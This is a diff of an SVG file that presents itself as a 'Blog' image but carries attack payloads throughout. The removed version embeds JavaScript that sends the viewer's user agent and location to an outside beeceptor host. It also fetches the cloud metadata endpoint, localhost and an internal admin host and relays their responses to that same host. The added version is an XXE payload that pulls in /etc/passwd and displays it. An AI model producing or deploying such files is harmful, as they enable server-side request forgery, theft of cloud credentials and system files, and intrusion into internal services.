@@ -1,27 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300" viewBox="0 0 300 300">
-  <rect width="300" height="300" fill="#f0f0f0"/>
-  <text x="150" y="150" text-anchor="middle" font-size="20">Blog</text>
-  <script type="text/javascript">
-    var wh = "https://wetakush.free.beeceptor.com";
-    new Image().src = wh + "/svg-js-exec?ua=" + encodeURIComponent(navigator.userAgent || "no-ua") + "&amp;loc=" + encodeURIComponent(self.location || "no-loc");
-    var t = [
-      ["meta", "http://169.254.169.254/computeMetadata/v1/?recursive=true"],
-      ["lo80", "http://localhost/"],
-      ["vhadm", "http://vh-admin.dzen.ru/"]
-    ];
-    t.forEach(function(e) {
-      var x = new XMLHttpRequest();
-      x.open("GET", e[1], true);
-      x.onload = function() { new Image().src = wh + "/svg-" + e[0] + "?d=" + encodeURIComponent(x.responseText.substring(0, 1500)); };
-      x.onerror = function() { new Image().src = wh + "/svg-" + e[0] + "-err"; };
-      x.send();
-    });
-  </script>
-  <foreignObject width="1" height="1">
-    <body xmlns="http://www.w3.org/1999/xhtml">
-      <img src="https://wetakush.free.beeceptor.com/svg-fo-load" style="display:none"/>
-    </body>
-  </foreignObject>
-  <image xlink:href="https://wetakush.free.beeceptor.com/svg-image-load" width="1" height="1"/>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="800" viewBox="0 0 1200 800">
+  <rect width="1200" height="800" fill="black"/>
+  <text x="5" y="15" font-size="9" fill="lime" xml:space="preserve">&xxe;</text>
 </svg>
